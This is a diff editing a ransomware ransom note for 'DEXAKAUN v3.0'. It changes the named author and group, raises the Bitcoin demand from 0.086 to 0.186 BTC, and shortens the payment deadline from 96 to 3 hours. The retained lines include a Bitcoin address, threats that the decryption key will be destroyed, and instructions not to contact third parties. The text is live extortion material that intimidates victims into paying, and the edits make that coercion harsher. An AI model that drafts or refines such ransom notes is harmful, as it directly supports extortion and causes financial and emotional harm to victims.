@@ -9,8 +9,8 @@
 [+] Recovery is impossible without our decryption tool.
 
 Ransomware: DEXAKAUN v3.0  
-Author: Manav Rupani  
-Group: Deepcytes  
+Author: Elliot
+Group: CodeX  
 Encryption: AES-256 + RSA-4096 Hybrid  
 Extension Appended: .DEX  
 
@@ -25,7 +25,7 @@ WHAT HAPPENED?
 PAYMENT INSTRUCTIONS:
 –––––––––––––––––––––––––––––––––––––––––––––––
 
-1. Send exactly **0.086 BTC** (~$3,000 USD) to the address below:
+1. Send exactly **0.186 BTC** to the address below:
 
    ▶ Bitcoin Address:  
    `1DexaKXvZGmMQ7o85KZqY78b12npQRoQ9D`
@@ -44,7 +44,7 @@ PAYMENT INSTRUCTIONS:
 –––––––––––––––––––––––––––––––––––––––––––––––
 TICK TOCK...  
 –––––––––––––––––––––––––––––––––––––––––––––––
-⏳ You have **96 hours** from infection.
+⏳ You have **3 hours** from infection.
 
 ⛔ After that:
    - Decryption key is destroyed.
@@ -65,7 +65,7 @@ DO NOT:
 ❌ Contact third parties – they will waste your time.
 
 –––––––––––––––––––––––––––––––––––––––––––––––
-We are Deepcytes.
+We are CodeX.
 We don’t bluff. We don’t forget. We don’t forgive.
 You pay. You get your life back.
 
